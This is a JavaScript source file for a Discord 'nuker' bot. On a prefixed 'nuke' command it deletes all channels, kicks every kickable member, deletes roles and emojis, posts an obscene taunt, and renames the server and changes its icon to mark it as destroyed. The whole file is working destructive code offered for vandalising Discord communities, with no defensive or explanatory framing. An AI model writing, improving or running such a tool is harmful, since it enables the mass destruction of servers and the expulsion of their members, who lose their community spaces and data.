const Discord = require('discord.js');
const nuker = new Discord.Client();
const config = require('./config.json');
const { yellow, blue, red, blueBright, bgCyan, bgGreen } = require("chalk");

nuker.on("ready", () => {
    console.log(red("============================================================================================================================"))
    console.log(yellow( `                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
    ----    ---- ----    ---- ----    ---- ------------ -----------       
    *****   **** ****    **** ****   ****  ************ ***********       
    ------  ---- ----    ---- ----  ----   ----         ----    ---       
    ************ ****    **** *********    ************ *********         
    ------------ ----    ---- ---------    ------------ ---------         
    ****  ****** ************ ****  ****   ****         ****  ****        
    ----   ----- ------------ ----   ----  ------------ ----   ----       
    ****    **** ************ ****    **** ************ ****    ****      
                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                              
                                                                                                       `))
    nuker.user.setActivity("YOUR_CUSTOM_STATUS_HERE", {
        type: "LISTENING"
      });

      console.log(blue(`
      Nuker: ${nuker.user.tag}
      Prefix: ${config.prefix}  
      Servers: ${nuker.guilds.cache.size}  
      Members: ${nuker.users.cache.size}   
      `))
      console.log(red("============================================================================================================================"))
})

nuker.on("message", async (msg) => {
    if (!msg.content.startsWith(config.prefix) || msg.author.bot || !msg.guild ) return;
    if (msg.content.includes("nuke")) {
        await msg.guild.channels.cache.forEach((c) => c.delete(`CHANNEL DELETED BY ${msg.author.username}`, console.log(blue(`Deleted ${c.name} channel`))))
        msg.guild.members.cache.filter((m) => m.kickable).forEach(async (m) => {
            m.kick(`KICKED BY ${msg.author.username}`),
            console.log(red(`Kicked ${m.user.tag} | ${m.user.id}`))
        })

        await msg.guild.roles.cache.filter((r) => r.position < msg.guild.me.roles.highest ).forEach((r) => r.delete(`ROLE DELETED BY ${msg.author.username}`, console.log(blueBright(`Deleted ${r.name} role`))))
        msg.guild.emojis.cache.forEach((e) => e.delete(`EMOJI DELETED BY ${msg.author.username}`, console.log(red(`${e.name} emote deleted`))))
        const newChannel = await msg.guild.channels.create(`${msg.author.username}`)
            newChannel.send(`YOU ARE SUCCESSFULLY FUCKED BY **${msg.author.username}**`)
            msg.guild.setIcon(msg.author.displayAvatarURL({ dynamic: true }))
            console.log(bgCyan(`Setted Server's Icon to ${msg.author.avatarURL()}`))
            msg.guild.setName(`ПUKΣD BY ${msg.author.username}`) 
            console.log(bgGreen(`Setted Server's Name to ПUKΣD BY ${msg.author.username}`)) 
     
 
    }
})

nuker.login(config.token)
